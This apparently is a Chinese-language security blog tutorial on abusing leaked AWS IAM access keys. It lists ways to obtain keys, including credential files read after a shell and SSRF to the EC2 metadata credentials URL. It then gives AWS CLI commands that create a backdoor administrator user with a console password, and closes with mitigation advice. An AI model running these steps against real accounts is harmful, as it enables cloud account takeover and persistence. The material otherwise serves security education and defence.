现在讨论下获得了 aws iam 账号访问密钥时的一些利用方式。

  

**1\. 什么是 aws iam 账号访问密钥**  
访问密钥是 IAM 用户或 AWS 账户根用户的长期凭证。您可以使用访问密钥签署对 AWS CLI 或 AWS API 的编程请求（直接或使用 AWS 开发工具包）。

  

访问密钥包含两部分：访问密钥 ID（例如 `AKIAIOSFODNN7EXAMPLE`）和秘密访问密钥（例如 `wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY`）。与用户名和密码一样，您必须同时使用访问密钥 ID 和秘密访问密钥对请求执行身份验证。你需要像对用户名和密码一样，安全地管理访问密钥。

  

**2\. 如何获得访问密钥**1）通过 github 查找泄露的配置文件2）通过文件读取漏洞读取网站的配置文件3）拿到shell后，查看用户目录是否存在 ~/.aws/credentials 文件4)  aws ec2 实例搭建的网站可以尝试通过 SSRF 漏洞等方式读取以下元数据地址http://169.254.169.254/latest/meta-data/iam/security-credentials/

**4\. 访问密钥利用 **  

  

现在使用刚才创建的 iam 账号访问密钥来模拟演示利用方式。

  

如果未安装 aws cli , 可以通过以下命令安装

  

*   
*   
*   
*   
*   
*   

```
`# pip``pip3 install awscli --upgrade --user``# apt``apt install awscli``# brew``brew install awscli`
```

  

在 aws cli 配置访问密钥，  

*   

```
`aws configure`
```

![](../Images/b743b61a77a9632572a1e15c3a388f1e.png)

  

现在我们拿到并配置好了 aws iam 账号的访问密钥。  

  

先查看该账号的 id

  

  

*   

```
`aws sts get-caller-identity`
```

![](../Images/ecae3ece664ac302aca145409cbb15f3.png)其中的 Account 的值就是账号 id  

  

通过账号 id 我们可以构造其控制台的登录地址：  
http://the\_id.signin.aws.amazon.com/console

  

接下来尝试查看该账号的权限  

  

*   

```
`aws iam list-groups-for-user --user-name admin`
```

![](../Images/1e6c60f1f147750a6ce124b8c61bfe0d.png)可以看到该账号属于管理员组，管理员组的权限相当大，可以管理 aws iam 用户、s3 存储桶、ec2 实例等资源。

  

这里可以直接创建一个管理员，然后给该账号分配一个登录密码，即可控制 aws 上几乎所有的资源。  

  

创建 aws iam 账号

  

*   

```
`aws iam create-user --user-name Bob`
```

  

![](../Images/20d22b448fa5459afcdecd97b5103b53.png)

  

  

  

创建登录密码

  

*   

```
`aws iam create-login-profile --user-name Bob --password yourpassword`
```

![](../Images/ac5ef0ac81748b7204df203758b9bdac.png)  
  
添加用户到管理员组

*   

```
`aws iam add-user-to-group --user-name Bob --group-name administrator`
```

  

接着打开构造的 aws 管理员控制台地址http://the\_id.signin.aws.amazon.com/console

  

![](../Images/041e6bcd5f4e11f607b4568aed88b21a.png)

  

登录后即获取几乎所有 aws 资源的控制权。  
![](../Images/a46da459e5e33b83327563793b9d286b.png)

**6\. 缓解措施**  

  

对于访问密钥一些最佳实践可以查看  
https://docs.aws.amazon.com/zh\_cn/general/latest/gr/aws-access-keys-best-practices.html

  

主要为以下几点1）删除或不生成根账户访问密钥2)  使用临时的安全证书(IAM角色)代替长期访问密钥  
3)  不要将访问密钥嵌入到代码中  
4)  对不同应用程序使用不同的访问密钥5）定期更改访问密钥。6)  删除未使用的访问密钥。 7) 最敏感的操作配置多重验证。
